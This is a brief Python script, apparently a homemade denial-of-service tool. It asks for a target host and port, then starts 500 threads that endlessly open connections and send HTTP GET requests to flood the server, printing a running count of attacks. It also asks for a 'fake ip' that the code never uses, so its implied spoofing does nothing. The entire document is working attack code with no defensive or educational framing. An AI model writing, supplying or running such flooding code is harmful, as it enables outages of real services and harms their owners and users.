#!/usr/bin/python3
import socket
import threading

target = input("Enter your target :")
fake_ip = input("Enter the fake ip :")
port = int(input("Enter the port to target :"))
attack_num = 0

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target,port))
		s.close()
		
		global attack_num
		attack_num +=1
		print(attack_num)
		s.close()

for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()

